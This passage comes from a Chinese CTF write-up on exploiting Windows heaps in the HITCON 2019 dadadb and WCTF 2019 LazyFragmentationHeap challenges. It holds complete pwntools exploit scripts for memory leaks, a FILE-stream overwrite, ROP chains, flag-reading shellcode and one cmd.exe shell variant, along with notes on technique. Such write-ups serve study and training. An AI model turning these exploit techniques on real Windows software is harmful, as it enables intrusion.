binbase+0x1b60log.info('Begin Brute Force...Please wait...:)')for i in range(0x1000/8): addr = start - 8*i #print i v = readmem(addr) if v == ret_addr : ret = addr log.success('find!!!') breakif ret == 0 : exit()log.success('ret_addr = '+hex(ret))add("lucas",0x200,"\x02"*0x200)add("lucas",0x100,"\x03"*0x100) #Aadd("david942j",0xf0,"a"*0x10+'b'*8) #Badd("mehqq",0xf0,"qq"*0x10)add("mehqq2",0xf0,"qq2"*0x10) #Dadd("mehqq3",0xf0,"qq3"*0x10)delete("mehqq2") #free Ddelete("david942j") #free Bshow("lucas")dump = p.recvuntil("b"*8)[:-8]david_fd = u64(dump[-16:-8])david_bk = u64(dump[-8:])header = u64(dump[-24:-16])david = david_fd - 0x200log.success('david_fd = '+hex(david_fd))log.success('david_bk = '+hex(david_bk))log.success('header = '+hex(header))log.success('david = '+hex(david))fakechunk = p64(0)+p64(header)+p64(password+0x10)+p64(david_bk)logout()#forge fake chunk in front of fpfake_User = 'orange'+'\x00'*2+p64(header)+p64(0xdeadbeef)+p64(password+0x10)[:-2]fake_Password = 'godlike'+'\x00'+p64(header)+p64(password-0x18)+p64(david)[:-2]login(fake_User,fake_Password)add("lucas",0x100,"a"*0x100+fakechunk)add("yy",0xf0,'g\n')#------------------------_fp = password + 0x30_cnt = 0_ptr = 0_base = ret_flag = 0x2080fd = 0bufsize = 0x100+0x10obj = p64(_ptr) + p64(_base) + p32(_cnt) + p32(_flag) + p32(fd) + p32(0) + p64(bufsize) +p64(0)obj+= p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2add("hh",0xf0,'a'*16 + p64(_fp) + p64(0) + obj) # overwrite fp'''p64(_ptr)+p64(_base)p32(_cnt=0)+p32(_flag=0x2080)+p32(_file)+p32(_charbuf=0)p64(_bufsiz=0x110)+p64(0)p64(0xffffffffffffffff)+p32(0xffffffff)+p32(0)p64(0)+p64(0)'''VirtualProtect = KERNEL32 + 0x1b680ReadFile = KERNEL32 + 0x22680pop_rdx_rcx_r8_r9_r10_r11 = ntdll + 0x8fb20buf = binbase + 0x5800rop = flat([pop_rdx_rcx_r8_r9_r10_r11,buf,hstdin,0x300,buf-8,0,0,ReadFile])rop+= flat([pop_rdx_rcx_r8_r9_r10_r11,0,0,0,0,0,0]) # ReadFile会下溢,pop掉脏数据rop+= flat([pop_rdx_rcx_r8_r9_r10_r11,0x1000,binbase+0x5000,0x40,buf-8,0,0,VirtualProtect,buf])logout()context.log_level = 'debug'raw_input()login('da','da') # trigger fread to do arbitrary writingraw_input()p.send(rop.ljust(0x100,'\x00')) # overwrite return address with rop chainWriteFile = KERNEL32 + 0x22770CreateFile = KERNEL32 + 0x222f0GetStdHandle = KERNEL32 + 0x1c890asm_str = '''sub rsp, 0x1000 ;// to prevent underflowingmov rax, 0x7478742e67616c66;// flag.txtmov [rsp + 0x100],raxmov byte ptr [rsp + 0x108], 0lea rcx, [rsp + 0x100] mov edx, 0x80000000mov r8d, 1xor r9d, r9dmov dword ptr[rsp + 0x20], 3mov dword ptr[rsp + 0x28], 0x80mov [rsp + 0x30], r9mov rax, %dcall rax ;// CreateFilemov rcx, raxlea rdx, [rsp + 0x200]mov r8d, 0x200lea r9, [rsp + 0x30]xor eax, eaxmov [rsp + 0x20], raxmov rax, %dcall rax ;// ReadFilemov ecx, 0xfffffff5; //STD_OUTPUT_HANDLEmov rax, %dcall rax ;// GetStdHandlemov rcx, raxlea rdx, [rsp + 0x200]mov r8d, [rsp + 0x30]lea r9, [rsp + 0x40]xor eax, eaxmov [rsp + 0x20], raxmov rax, %dcall rax ;// WriteFilemov rax, %dcall rax ;// exit''' % (CreateFile,ReadFile,GetStdHandle,WriteFile,binbase+0x1B86)shellcode = asm(asm_str)raw_input()p.send(shellcode)p.interactive() getshell_exp：真正的环境是限制了getshell的，所以shellcode才是正道，这里只是尝试一下。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204#coding:utf-8from pwn import *context.arch = "amd64"p = remote('192.168.21.1',8888)def login(user,name): p.recvuntil("&gt;&gt;") p.sendline("1") p.recvuntil(":") p.sendline(user) p.recvuntil(":") p.sendline(name)def logout(): p.recvuntil('&gt;&gt; ') p.sendline('4')def add(key,size,content): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('Key:') p.send(key) p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Data:') p.send(content)def delete(key): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('Key:') p.send(key)def show(key): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('Key:') p.send(key)login('orange','godlike')#Enable LFHfor i in range(19): add("\x01lays"+str(i),0x90,"fuck")#Fill UserBlockfor i in range(0x10): add("\x02xxrw_"+str(i),0x90,"xxrw")#leave a holedelete("\x02xxrw_15")#Fill the hole with structureadd("\x02xxrw_14",0x60,'\x14'*0x70) show("\x02xxrw_14")p.recvuntil('\x14'*0x70)heapbase = u64(p.recv(8)) &amp; 0xffffffffffff0000if heapbase == 0: log.info('bad luck...try again~~~') exit()log.success('heapbase = '+hex(heapbase))p.recvuntil(p64(0x90))key = p.recvuntil("\x00")[:-1]log.success('next_key = '+key)#--------------------------------------------------------add('\x02xxrw_14',0x60,'\x14'*0x70+p64(heapbase+0x10))show(key)dump = p.recvuntil('orange')log.info('check...')if p32(0xffeeffee) not in dump: log.info('bad luck...try again~~~') exit()log.success('success!!!')def readmem(addr): global key add('\x02xxrw_14',0x60,'\x14'*0x70+p64(addr)) show(key) p.recvuntil(":") return u64(p.recvuntil("orange")[:8].ljust(8,"\x00"))_heap_lock = readmem(heapbase+0x2c0)log.success('_heap_lock = '+hex(_heap_lock))ntdll = _heap_lock + (0x7ffcb0ad0000-0x7ffcb0c33d30) - 0x60log.success('ntdll = '+hex(ntdll))PebLdr_addr = ntdll + (0x7ffcb0c353c0-ntdll)log.success('PebLdr_addr = '+hex(PebLdr_addr))immol = PebLdr_addr + 0x20ldrdata = readmem(immol)binentry = readmem(ldrdata + 0x28)binbase = binentry-0x1e54-0x1c-0x40log.success('binbase = '+hex(binbase))ucrtbase = readmem(binbase+0x31D0) - (0x7ffcad8f0760-0x00007ffcad870000)log.success('ucrtbase = '+hex(ucrtbase))system = ucrtbase+(0x7ffcad91bba0-0x7ffcad870000)Peb = readmem(PebLdr_addr-(0xc0-0x88)) - 0x340log.success('Peb = '+hex(Peb))Teb = Peb + 0x1000log.success('Teb = '+hex(Teb))IAT = binbase + 0x3000KERNEL32_ReadFile = readmem(IAT)KERNEL32 = KERNEL32_ReadFile - (0x0007ffcafb82680-0x7ffcafb60000)log.success('KERNEL32 = '+hex(KERNEL32))stack_end = readmem(Teb+0x8)log.success('stack_end = '+hex(stack_end))cookie = readmem(heapbase+0x88)log.success('cookie = '+hex(cookie))processparameter = readmem(Peb+0x20)hstdin = readmem(processparameter+0x20)log.success('hstdin = '+hex(hstdin))password = binbase+0x5648start = stack_end-8ret = 0#ret_addr = binbase+0x1E38ret_addr = binbase+0x1b60log.info('Begin Brute Force...Please wait...:)')for i in range(0x1000/8): addr = start - 8*i #print i v = readmem(addr) if v == ret_addr : ret = addr log.success('find!!!') breakif ret == 0 : exit()log.success('ret_addr = '+hex(ret))add("lucas",0x200,"\x02"*0x200)add("lucas",0x100,"\x03"*0x100) #Aadd("david942j",0xf0,"a"*0x10+'b'*8) #Badd("mehqq",0xf0,"qq"*0x10)add("mehqq2",0xf0,"qq2"*0x10) #Dadd("mehqq3",0xf0,"qq3"*0x10)delete("mehqq2") #free Ddelete("david942j") #free Bshow("lucas")dump = p.recvuntil("b"*8)[:-8]david_fd = u64(dump[-16:-8])david_bk = u64(dump[-8:])header = u64(dump[-24:-16])david = david_fd - 0x200log.success('david_fd = '+hex(david_fd))log.success('david_bk = '+hex(david_bk))log.success('header = '+hex(header))log.success('david = '+hex(david))fakechunk = p64(0)+p64(header)+p64(password+0x10)+p64(david_bk)logout()#forge fake chunk in front of fpfake_User = 'orange'+'\x00'*2+p64(header)+p64(0xdeadbeef)+p64(password+0x10)[:-2]fake_Password = 'godlike'+'\x00'+p64(header)+p64(password-0x18)+p64(david)[:-2]login(fake_User,fake_Password)add("lucas",0x100,"a"*0x100+fakechunk)add("yy",0xf0,'g\n')#------------------------_fp = password + 0x30_cnt = 0_ptr = 0_base = ret_flag = 0x2080fd = 0bufsize = 0x100+0x10obj = p64(_ptr) + p64(_base) + p32(_cnt) + p32(_flag) + p32(fd) + p32(0) + p64(bufsize) +p64(0)obj+= p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2add("hh",0xf0,'a'*16 + p64(_fp) + p64(0) + obj) # overwrite fp'''p64(_ptr)+p64(_base)p32(_cnt=0)+p32(_flag=0x2080)+p32(_file)+p32(_charbuf=0)p64(_bufsiz=0x110)+p64(0)p64(0xffffffffffffffff)+p32(0xffffffff)+p32(0)p64(0)+p64(0)'''VirtualProtect = KERNEL32 + 0x1b680ReadFile = KERNEL32 + 0x22680pop_rdx_rcx_r8_r9_r10_r11 = ntdll + 0x8fb20buf = binbase + 0x5800raw_input()rop = flat([pop_rdx_rcx_r8_r9_r10_r11,0,password,0,0,0,0,system])logout()login('da','cmd.exe\x00') # trigger fread to do arbitrary writingraw_input()p.send(rop.ljust(0x100,'\x00')) # overwrite return address with rop chainp.interactive() 官方exp：https://github.com/scwuaptx/CTF/tree/master/2019-writeup/hitcon/dadadb 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import timehost = "10.211.55.24"port = 6677host = "13.230.51.176"port = 4869context.arch = "amd64" r = remote(host,port)def login(user,name): r.recvuntil("&gt;&gt;") r.sendline("1") r.recvuntil(":") r.sendline(user) r.recvuntil(":") r.sendline(name)def add(key,size,data): r.recvuntil("&gt;&gt;") r.sendline("1") r.recvuntil(":") r.send(key) r.recvuntil(":") r.sendline(str(size)) r.recvuntil(":") r.send(data)def view(key): r.recvuntil("&gt;&gt;") r.sendline("2") r.recvuntil(":") r.send(key)def free(key): r.recvuntil("&gt;&gt;") r.sendline("3") r.recvuntil(":") r.send(key)def logout(): r.recvuntil("&gt;&gt;") r.sendline("4")login("ddaa","phdphd")#Enable LFHfor i in range(19): add("lays" + str(i),0x90,"fuck")#Fill UserBlockfor i in range(0x10): add("dada" + str(i),0x90,"ggwp")#leave a holefree("dada15")#Fill the hole with structureadd("dada14",0x60,'a'*0x70) #leak heap ptrview("dada14")r.recvuntil("a"*0x70)heap =u64(r.recv(8)) &amp; 0xffffffffffff0000print "heap:",hex(heap)if heap == 0 : exit();r.recvuntil(p64(0x90))ids = r.recvuntil("\x00")[:-1]print "leakid:",ids#check heap with signatureadd("dada14",0x60,'a'*0x70 + p64(heap+0x10)) view(ids)dump = r.recvuntil("ddaa")if p32(0xffeeffee) not in dump: view(ids) exit()def readmem(addr): global ids add("dada14",0x60,'a'*0x70 + p64(addr)) view(ids) r.recvuntil(":") return u64(r.recvuntil("ddaa")[:8].ljust(8,"\x00")) lock = readmem(heap+0x2c0)ntdll = lock - 0x163cb0-0x20-0x40print "ntdll:",hex(ntdll)pebldr = ntdll + 0x1653a0immol = pebldr + 0x20ldrdata = readmem(immol)bin_entry = readmem(ldrdata + 0x28)bin_base = bin_entry - 0x1e54-0x1c-0x40print "bin:",hex(bin_base)iat = bin_base + 0x3000readfile = readmem(iat)kernel32 = readfile - 0x22680print "kernel32:",hex(kernel32)peb = readmem(ntdll+0x165308) - 0x80teb = peb + 0x1000stack = readmem(teb+0x10+1) &lt;&lt; 8print "stack:",hex(stack)stack_end = stack + (0x10000 - (stack &amp; 0xffff))cookie = readmem(heap+0x88)print "cookie:",hex(cookie)processparameter = readmem(peb+0x20)hstdin = readmem(processparameter+0x20)print "hstdin:",hex(hstdin)password = bin_base + 0x5658start = stack_end - 8ret = 0ret_addr = bin_base+0x1b60for i in range(0x1000/8): addr = start - 8*i print i v = readmem(addr) if v == ret_addr : ret = addr print "found!" breakprint "ret:",hex(ret)if ret == 0 : exit()add("lucas",0x200,"king")add("lucas",0x100,"ggwp")add("david942j",0xf0,"a"*0x10+'b'*8)add("mehqq",0xf0,"qq")add("mehqq2",0xf0,"qq")add("mehqq3",0xf0,"qq")free("mehqq2")free("david942j")view("lucas")dump = r.recvuntil("b"*8)[:-8]davidfd = u64(dump[-16:-8])davidbk = u64(dump[-8:])header = u64(dump[-24:-16])david = davidfd - 0x200fakechunk = p64(0) + p64(header) + p64(password) + p64(davidbk)logout()#forge fake chunk in front of fplogin("ddaa" + "\x00"*4 + p64(header) + p64(0xdeadbeef) + p64(password)[:-2],"phdphd" + "\x00"*2 + p64(header) + p64(password-0x28) + p64(david)[:-2])add("lucas",0x100,"a"*0x100 + fakechunk)add("yy",0xf0,'g\n')fp = password + 0x20cnt = 0_ptr = 0_base = retflag = 0x2080fd = 0bufsize = 0x100+0x10obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag) + p32(fd) + p32(0) + p64(bufsize) +p64(0)obj += p64(0xffffffffffffffff) + p32(0xffffffff) + p32(0) + p64(0)*2add("hh",0xf0,'a'*16 + p64(fp) + p64(0) + obj) # overwrite fpvirtualprotect = kernel32 + 0x1b680readfile = kernel32 + 0x22680pop_rdx_rcx_r8_r9_r10_r11 = ntdll + 0x8fb30buf = bin_base + 0x5800rop = flat([pop_rdx_rcx_r8_r9_r10_r11,buf,hstdin,0x300,buf-8,0,0,readfile])rop += flat([pop_rdx_rcx_r8_r9_r10_r11,0x1000,bin_base+0x5000,0x40,buf-8,0,0,virtualprotect,buf])logout()# Use FILE stream exploit to do arbitrary writinglogin('da','da') # trigger fread to do arbitrary writingr.send(rop.ljust(0x100,'\x00')) # overwrite return address with rop chaintime.sleep(1)processheap = peb+0x30heapcreate = kernel32 + 0x1ec80ldrheap = ntdll+0x165400winexec = kernel32+0x5f090writefile = kernel32 + 0x22770createfile = kernel32 + 0x222f0getstdhandle = kernel32+0x1c890sc = asm(""" xor rcx,rcx xor rdx,rdx xor r8,r8 xor r9,r9 xor rdi,rdi mov cl,2 mov rdi,0x%x call rdi mov rdi,0x%x mov qword ptr [rdi],rax mov rdi,0x%x mov qword ptr [rdi],rax jmp flagxs : pop r10createfile: mov qword ptr [rsp+0x40],3 mov qword ptr [rsp+0x30],0 mov qword ptr [rsp+0x28],0 lea r12,qword ptr [rsp+0x40] mov qword ptr [rsp+0x20],3 mov r8,1 xor r9,r9 mov rdx,0x80000000 mov rcx,r10 mov r11,0x%x call r11readfile: mov qword ptr [rsp+0x20],0 xor r9,r9 mov r8,0x80 mov rdx,0x%x mov rcx,rax mov r11,0x%x call r11getstdhandle: mov rcx,0xfffffff6 mov r11,0x%x call r11writefile: mov qword ptr [rsp+0x20],0 xor r9,r9 mov r8,0x80 mov rdx,0x%x mov rcx,rax mov r11,0x%x call r11loop: jmp loopflagx: call s""" % (heapcreate,processheap,ldrheap,createfile,buf+0x400,readfile,getstdhandle,buf+0x400,writefile))flagfile = "C:\\\\dadadb\\flag.txt"r.sendline(sc + flagfile + "\x00")r.interactive() 反思与收获：关于shellcode，出题人原话： After we have arbitrary memory writing we can overwrite return address on stack with ROP. But it disallow child process , you can not create new process. We need use ROP to read flag.txt, but it’s a little complicated. So we use ROP to do VirtualProtect to change page permission so that we can jump to shellcode. After we can run shellcode, we can read files more easily. We use some function to read file Kernel32 (because we only provide kernel32.dll and ntdll.dll for challenger) CreateFile/ReadFile/GetStdHandle/WriteFile If it use default heap You should create new heap for windows API, otherwise you will encounter heap detection Overwrite _PEB-&gt;ProcessHeap/ucrtbase!crtheap/ntdll!ldrpheap with new heap. 如果提供了ucrtbase，那么应该普通的open/read/write应该也是可以的。 如果是default heap的话，shellcode要复杂一点？但是我用栈的没区别吧。。。？ 关于VirtualProtect： BOOL VirtualProtect( LPVOID lpAddress, DWORD dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);各参数的意义为： lpAddress，要改变属性的内存起始地址。 dwSize，要改变属性的内存区域大小。 flNewProtect，内存新的属性类型，设置为PAGE_EXECUTE_READWRITE（0x40）时该内存页为可读可写可执行。 pflOldProtect，内存原始属性类型保存地址。 修改内存属性成功时函数返回非0，修改失败时返回0。 如果我们能够按照如下参数布置好栈帧的话就可以将shellcode所在内存区域设置为可执行模式。 BOOL VirtualProtect( shellcode所在内存空间起始地址, shellcode大小, 0x40, 某个可写地址 常见的泄露链： 有binbase时： 可用IAT表泄露KERNEL32.dll和ucrtbase.dll和ntdll.dll 再用ntdll.dll泄露PebLdr_addr，利用PebLdr_addr泄露Peb，利用Peb泄露Teb，利用Peb+0x30泄露_HEAP，利用Teb泄露stack_end。 有_HEAP时： 可用_HEAP_LOCK(_HEAP+0x2c0)泄露ntdll.dll 在上面第二条的基础上加上几条：利用Peb+0x10泄露binbase，利用Peb+0x20泄露ProcessParameters，有了ProcessParameters可泄露StandardInput(offset=0x20)，StandardOutput(offset=0x28)，StandardError(offset=0x30)。 其他： CreateFile，ReadFile，GetStdHandle，WriteFile这四个写shellcode必备函数都在KERNEL32.dll中，而system函数在ucrtbase.dll中。 当遇到default heap时，采用LFH来defeat random是个好方法。而且LFH较为稳定且检测较少，在后端分配器时，每次free一个chunk时，都会对next_chunk的头部进行检测，我们必须伪造header，但是LFH却没有，所以操作起来方便很多。 Windows平台下的函数可能会出现下溢的情况，也就是underflow，需要防止这种情况出现，rop之前要先抬栈。 windows x64平台fastcall调用约定的主要特性如下： 前四个整型或指针类型参数由RCX,RDX,R8,R9依次传递，前四个浮点类型参数由XMM0,XMM1,XMM2,XMM3依次传递。 调用函数为前四个参数在调用栈上保留相应的空间，称作shadow space或spill slot。即使被调用方没有或小于4个参数，调用函数仍然保留那么多的栈空间，这有助于在某些特殊情况下简化调用约定。 除前四个参数以外的任何其他参数通过栈来传递，从右至左依次入栈。 由调用函数负责清理调用栈。 小于等于64位的整型或指针类型返回值由RAX传递。 浮点返回值由XMM0传递。 更大的返回值(比如结构体)，由调用方在栈上分配空间，并有RCX持有该空间的指针并传递给被调用函数，因此整型参数使用的寄存器依次右移一格，实际只可以利用3个寄存器，其余参数入栈。函数调用结束后，RAX返回该空间的指针。 除RCX,RDX,R8,R9以外，RAX、R10、R11、XMM4 和 XMM5也是易变化的(volatile)寄存器。 RBX,RBP, RDI, RSI, R12, R14, R14, and R15寄存器则必须在使用时进行保护。 在寄存器中，所有参数都是右对齐的。小于64位的参数并不进行高位零扩展，也就是高位是无法预测的垃圾数据。 GetStdHandle的三种参数的数值： STD_ERROR_HANDLE: 0xfffffff4 STD_OUTPUT_HANDLE：0xfffffff5 STD_INPUT_HANDLE：0xfffffff6 2019WCTF_LazyFragmentationHeap这题应该是目前来看遇到的最复杂的一题了(如果dadadb是在Default Heap上的话可能也会很复杂)，复现完以后感觉还是很多疑惑的地方。。。 遇到的问题与心得： Default Heap的情况较为复杂，与是否有pdb文件，源码文件等都有关，因为这些东西可能加载到windbg中会影响调试态堆块的布局，以及增大了某个size的堆块开启LFH的概率。因为我之前一直带着pdb调试，然后windbg里面看到的0x60这个size的chunk，早都开启了LFH，导致我没法覆写和伪造fake_file，后来删了pdb文件之后才可以正常进行。 unlink可以在malloc中实现，也可以在free中实现。windows的unlink要比linux的简单许多，因为不需要构造假的chunk，只需要知道指针地址即可。 fake_Flink = &amp;target-8，fake_Blink = &amp;target pioinfo_offset实际上是每次都会随机化的，和堆的状态有关系，所以我们用一次单独的进程泄露pioinfo_offset传给下一次进程使用实际上是没有意义的。。。虽说是随机化，但是实际上值就那么几个，所以我们可以猜一个即可，大概两三次就可能撞上一次。我这里用的是0x8740，还有0x83a0出现的也比较频繁。 关于shellcode，因为在CreateFile/open时，会动态申请chunk出来作为File结构体，所以如果我们的堆已经损坏的话，这一步会报错(不禁感叹linux下open的幸运)，所以shellcode里我们需要用HeapCreateStub创建一个新堆，然后把进程的ProcessHeap(Peb+0x300)改成新堆的地址，之后又分两条路： KERNEL32流派：需要将ntdll!LdrpHeap的值改为新堆的地址，然后调用CreateFile/GetStdHandle/ReadFile/WriteFile。 ucrtbase流派：需要将ucrtbase!_acrt_heap的值改为新堆的地址，然后调用open/_read/_write。 _HEAP的Encoding每次都会随机化，且无法从_HEAP中读取，直接看_HEAP+0x80处的值是为空的，只能自己泄露chunkheader，然后自己伪造一个加密前的，然后异或回去。 关于泄露在linux和windows下的一些区别： linux的topchunk没有mainarena的地址，所以我们没法直接用new,delete(与topchunk合并),new,show来泄露，但是windows的伪topchunk，(实际上没有topchunk这一说，只是一个很大的chunk罢了)，的FLink与BLink是含有heap地址的，可以用new,delete(与伪topchunk合并),new,show来泄露_HEPA。 windows下的伪随机化：binbase，各种dllbase都是系统重启才会随机化。还有很重要的一点就是很多重要数据结构的地址都是一层套一层的，所以当我们有了一个任意地址读的机会，我们就可以利用这个特点进行分段泄露。因为有时候得到一次任意读的机会需要很复杂的chunk构造，导致后面没法继续利用，分段泄露就可以使我们泄露出所有关键数据后再直接构造利用链。 windows下的真随机化：stack，heap，Peb，Teb。这四个东西是每次程序启动都会随机化，所以他们无法用分段泄露的方法来泄露。只能一气喝成。 _HEAP我觉得是winpwn中最重要的数据结构，里面含有很多重要数据，例如：ntdll_base，bin_base。 一般想后续利用的话，binbase是必须知道的，因为大部分情况泄露KERNEL32和ucrtbase都需要用binbase中的IAT表。而后续的rop又必须得用这两个库中的函数。 一般泄露流程为：泄露_HEAP，泄露ntdll，泄露PebLdr 有了PebLdr之后，就可以泄露Peb与Teb了，Peb中也有binbase。但是因为Peb是真随机化，所以没法分段泄露，所以用_HEAP泄露binbase更好。 在PebLdr+0x20处为imoml( Ldr.InMemoryOrderModuleList)，其指向_HEAP的某个地方，在这个地方+0x28处有binbase存在，我们可以获得其值然后与0xffff按位与得到其偏移，再分段泄露出binbase。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849typedef struct _PEB_LDR_DATA &#123; ULONG Length; BOOLEAN Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; &#125; PEB_LDR_DATA, *PPEB_LDR_DATA;typedef struct _LDR_DATA_TABLE_ENTRY &#123; LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; USHORT LoadCount; USHORT TlsIndex; union &#123; LIST_ENTRY HashLinks; struct &#123; PVOID SectionPointer; ULONG CheckSum; &#125;; &#125;; union &#123; ULONG TimeDateStamp; PVOID LoadedImports; &#125;; PVOID EntryPointActivationContext; PVOID PatchInformation; &#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;PEB_LDR_DATA PebLdrLdrpInitializeProcess //初始化进程时用空项PebLdr创建Ldr Peb-&gt;Ldr = &amp;PebLdr; InitializeListHead(&amp;PebLdr.InLoadOrderModuleList); InitializeListHead(&amp;PebLdr.InMemoryOrderModuleList); InitializeListHead(&amp;PebLdr.InInitializationOrderModuleList); PebLdr.Length = sizeof(PEB_LDR_DATA); PebLdr.Initialized = TRUE; 123456789101112131415161718192021222324252627282930313233343536373839404142430:000&gt; dt _PEB_LDR_DATAntdll!_PEB_LDR_DATA +0x000 Length : Uint4B +0x004 Initialized : UChar +0x008 SsHandle : Ptr64 Void +0x010 InLoadOrderModuleList : _LIST_ENTRY +0x020 InMemoryOrderModuleList : _LIST_ENTRY +0x030 InInitializationOrderModuleList : _LIST_ENTRY +0x040 EntryInProgress : Ptr64 Void +0x048 ShutdownInProgress : UChar +0x050 ShutdownThreadId : Ptr64 Void0:000&gt; !pebPEB at 0000000000265000 InheritedAddressSpace: No ReadImageFileExecOptions: No BeingDebugged: Yes ImageBaseAddress: 0000000000400000 NtGlobalFlag: 0 NtGlobalFlag2: 0 Ldr 00007ffcb0c353c0 Ldr.Initialized: Yes Ldr.InInitializationOrderModuleList: 00000000008a2800 . 00000000008a6210 Ldr.InLoadOrderModuleList: 00000000008a2970 . 00000000008a6550 Ldr.InMemoryOrderModuleList: 00000000008a2980 . 00000000008a6560 ^0:000&gt; dt _PEB_LDR_DATA 00007ffcb0c353c0ntdll!_PEB_LDR_DATA +0x000 Length : 0x58 +0x004 Initialized : 0x1 &apos;&apos; +0x008 SsHandle : (null) +0x010 InLoadOrderModuleList : _LIST_ENTRY [ 0x00000000`008a2970 - 0x00000000`008a6550 ] +0x020 InMemoryOrderModuleList : _LIST_ENTRY [ 0x00000000`008a2980 - 0x00000000`008a6560 ] +0x030 InInitializationOrderModuleList : _LIST_ENTRY [ 0x00000000`008a2800 - 0x00000000`008a6210 ] +0x040 EntryInProgress : (null) +0x048 ShutdownInProgress : 0 &apos;&apos; +0x050 ShutdownThreadId : (null) 00000000`008a2970 00000000008a27e0 00007ffcb0c353d000000000`008a2980 00000000008a27f0 00007ffcb0c353e000000000`008a2990 0000000000000000 000000000000000000000000`008a29a0 0000000000400000 0000000000401500 &lt;== binbase 其他： 溢出不光可以改Flink&amp;Blink来进行unlink，还可与delete配合，伪造chunk_header进行chunkoverlapping，再进一步利用。 myexp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425#coding:utf-8from pwn import *context.arch='amd64'#context.log_level = 'debug'ip = '192.168.21.1'port = 10000p = 0p = remote(ip,port)def new(size,idx): p.recvuntil('Your choice: ') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('ID:') p.sendline(str(idx))def edit(idx,content): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('ID:') p.sendline(str(idx)) p.recvuntil('Content:') p.send(content)def delete(idx): p.recvuntil('Your choice: ') p.sendline('4') p.recvuntil('ID:') p.sendline(str(idx))def show(idx): p.recvuntil('Your choice: ') p.sendline('3') p.recvuntil('ID:') p.sendline(str(idx))def open_file(): p.recvuntil('Your choice: ') p.sendline('5') p.recvuntil('Your choice: ') p.sendline('1') p.recvuntil('Your choice: ') p.sendline('3')def read_file(idx,size,content=None): p.recvuntil('Your choice: ') p.sendline('5') p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('ID:') p.sendline(str(idx)) p.recvuntil('Size:') p.sendline(str(size)) if(content): p.send(content) p.recvuntil('Your choice: ') p.sendline('3')#--------------------------------leak ntdll-------------------------------------while True: for i in range(6): open_file() new(0x88,1) new(0x88,2) new(0x88,3) read_file(1,0x88) show(1) p.recvuntil(' al') Encoding = u64(p.recvuntil('\r\n',drop=True).ljust(8,'\x00')) ^ 0x0000000908010009 log.success('Encoding = '+hex(Encoding)) payload = '\x11'*0x88 + p64(0x0800000913010012 ^ Encoding)[:6] edit(1,payload) delete(2) new(0x88,4) show(3) p.recvuntil('Content: ') heapbase = (u64(p.recvuntil('\r\n',drop=True).ljust(8,'\x00'))-0x10000) &amp; 0xffffffffffff0000 if(heapbase != 0): log.success('heapbase = '+hex(heapbase)) else: p.close() p = remote('192.168.21.1',10000) continue#---------------------------------------------------------------------------------- open_file() fake_file = p64(0)+p64(0xBEEFDAD0000+0x28+0x20) fake_file+= p32(0)+p32(0x2080)+p32(0)+p32(0) fake_file+= p64(0x100)+p64(0) fake_file+= p64(0xffffffffffffffff)+p32(0xffffffff)+p32(0) fake_file+= p64(0)+p64(0) edit(3,fake_file) read_file(4,8,p64(heapbase+0x2c0)) show(4) p.recvuntil('Content: ') ntdll = u64(p.recvuntil('\r\n',drop=True).ljust(8,'\x00'))-(0x0007ffcb0c33cd0-0x00007ffcb0ad0000) log.success('ntdll = '+hex(ntdll)) p.close() breakPebLdr = ntdll+(0x0007ffcb0c353c0-0x0007ffcb0ad0000)log.success('PebLdr = '+hex(PebLdr))#-----------------------------------leak other----------------------------------------------------def leak(target,heap_offset=0): global p p = remote(ip,port) while True: try: for i in range(6): open_file() new(0x88,1) new(0x88,2) new(0x88,3) read_file(1,0x88) show(1) p.recvuntil(' al') Encoding = u64(p.recvuntil('\r\n',drop=True).ljust(8,'\x00')) ^ 0x0000000908010009 #log.success('Encoding = '+hex(Encoding)) payload = '\x11'*0x88 + p64(0x0800000913010012 ^ Encoding)[:6] edit(1,payload) delete(2) new(0x88,4) show(3) p.recvuntil('Content: ') heapbase = (u64(p.recvuntil('\r\n',drop=True).ljust(8,'\x00'))-0x10000) &amp; 0xffffffffffff0000 #log.success('heapbase = 